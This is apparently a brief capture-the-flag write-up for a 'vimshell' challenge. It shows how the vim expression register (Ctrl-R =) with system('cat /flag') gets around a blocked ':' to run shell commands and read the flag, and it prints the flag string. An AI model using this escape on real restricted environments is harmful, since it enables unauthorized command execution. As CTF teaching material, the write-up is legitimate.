# vimshell

This problem is about patched vim (connected by websocket).

We can't using `:`, but we need to get shell.

And I found vim can calculate expression (In insert mode, typing `Ctrl-R`+`=`)

Example: `<C-R>=2+2` will output `4`

There is a useful function `system()` that we can use.

`<C-R>=system('cat /flag')`

`TWCTF{the_man_with_the_vim}`
